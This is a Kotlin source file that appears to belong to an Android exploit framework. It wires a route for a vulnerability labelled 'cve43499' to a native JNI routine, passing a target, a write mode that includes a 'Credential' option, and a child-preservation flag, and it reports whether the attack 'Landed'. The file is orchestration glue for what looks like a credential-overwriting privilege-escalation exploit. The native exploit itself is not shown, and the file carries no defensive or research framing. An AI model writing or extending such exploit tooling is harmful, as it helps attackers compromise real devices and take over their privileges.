package com.ghostlock.app.backend.cve43499.ktstep.run

import com.ghostlock.app.engine.ktstep.PayloadPageInputs
import com.ghostlock.app.engine.ktstep.RouteResult
import com.ghostlock.app.engine.ktstep.WriteMode
import com.ghostlock.app.engine.ktstep.WriteRequest
import com.ghostlock.app.jni.cve43499.NativeSelectLegacyJni

/** select_stack via the self-contained reference route; Kotlin owns target/mode/preserve. */
class Cve43499SelectLegacyPort : Cve43499RoutePort {
    override val route: Cve43499RouteId = Cve43499RouteId.SelectStack

    override fun attempt(request: WriteRequest, page: ByteArray, inputs: PayloadPageInputs, params: ByteArray): RouteResult {
        if (params.isNotEmpty()) return RouteResult.Refused("select-legacy-params-unexpected")
        val mode = when (request.mode) {
            WriteMode.Disabled -> 0
            WriteMode.Zero -> 1
            WriteMode.Credential -> 2
        }
        val result = NativeSelectLegacyJni.run(request.target, mode, request.preserveChild)
            ?: return RouteResult.Refused("select-legacy-jni-null")
        return if (result.ok) RouteResult.Landed() else RouteResult.Refused(
            "select-legacy:" + result.status + ":" + result.step + ":" + result.errno,
        )
    }

    override fun close() = Unit
}
